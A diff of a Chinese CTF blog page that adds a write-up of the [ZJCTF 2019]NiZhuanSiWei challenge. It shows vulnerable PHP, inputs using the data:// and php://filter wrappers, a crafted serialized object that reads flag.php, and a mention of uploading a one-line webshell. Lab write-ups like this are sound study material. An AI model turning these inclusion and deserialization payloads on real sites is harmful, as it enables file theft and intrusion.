@@ -172,7 +172,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/ctf/" style="color: #ff7d73">ctf</a>
+                <a href="/tags/ctf/" style="color: #ffa2c4">ctf</a>
             </span>
             
             <span class="tag">
@@ -366,8 +366,70 @@ class Config(object):
 <p>修改content-type后就可以上传了，同样再将一句话🐎传上去</p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306041507538.png" alt="image-20230604150716485"></p>
 <p>获取路径后用shell工具进行连接，flag就在根目录下</p>
-<h3 id="2023-6-5-ZJCTF-2019-NiZhuanSiWei"><a href="#2023-6-5-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="2023.6.5 [ZJCTF 2019]NiZhuanSiWei"></a>2023.6.5 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ZJCTF%202019]NiZhuanSiWei">[ZJCTF 2019]NiZhuanSiWei</a></h3><p>是否查看wp：</p>
+<h3 id="2023-6-5-ZJCTF-2019-NiZhuanSiWei"><a href="#2023-6-5-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="2023.6.5 [ZJCTF 2019]NiZhuanSiWei"></a>2023.6.5 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ZJCTF%202019]NiZhuanSiWei">[ZJCTF 2019]NiZhuanSiWei</a></h3><p>这题考查的是php伪协议与反序列化，给出了代码</p>
+<pre><code class="php">&lt;?php  
+    $text = $_GET[&quot;text&quot;];
+$file = $_GET[&quot;file&quot;];
+$password = $_GET[&quot;password&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;
+    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+    if(preg_match(&quot;/flag/&quot;,$file))&#123;
+        echo &quot;Not now!&quot;;
+        exit(); 
+    &#125;else&#123;
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    &#125;
+&#125;
+else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt; 
+</code></pre>
+<p>首先看第一个需要传入的text参数，需要被设置且调用<code>file_get_contents()</code>读取文件中内容，我第一反应是需要在服务器上放一个文件，内容是 welcome to the zjctf，但是觉得不太可能这么考，看了之后才想起来可以用php的伪协议data:&#x2F;&#x2F;，可以构造</p>
+<pre><code class="htthp">?text=data://text/plain,welcome to the zjctf
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306051732481.png" alt="image-20230605173205451"></p>
+<p>之后看第二个参数file，这里是文件包含，但是flag被过滤了，不能直接去访问，看到有提示useless.php，于是尝试包含它，之后发现因为被解析了什么都没有，所以应该先base64编码读文件</p>
+<pre><code class="html">?file=php://filter/convert.base64-encode/resource=useless.php
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306051732057.png" alt="image-20230605173245026"></p>
+<p>读取到文件之后用base64解码，获得useless.php的源码</p>
+<pre><code class="php">&lt;?php  
 
+class Flag&#123;  //flag.php  
+    public $file;  
+    public function __tostring()&#123;  
+        if(isset($this-&gt;file))&#123;  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        &#125;  
+    &#125;  
+&#125;  
+?&gt;  
+</code></pre>
+<p>这里一个类反序列化直接给file赋值就行</p>
+<pre><code class="php">&lt;?php  
+class Flag&#123;  //flag.php  
+    public $file = &quot;flag.php&quot;;  
+    public function __tostring()&#123;  
+        if(isset($this-&gt;file))&#123;  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        &#125;  
+    &#125;  
+&#125;  
+echo serialize(new Flag());
+</code></pre>
+<p>得到结果O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p>最后传入payload：</p>
+<p><code>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306051740188.png" alt="image-20230605174017012"></p>
+<p>查看源码即可得到flag</p>
+<h3 id="2023-6-6-极客大挑战-2019-HardSQL"><a href="#2023-6-6-极客大挑战-2019-HardSQL" class="headerlink" title="2023.6.6 [极客大挑战 2019]HardSQL"></a>2023.6.6 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL">[极客大挑战 2019]HardSQL</a></h3>
     </div>
     
     
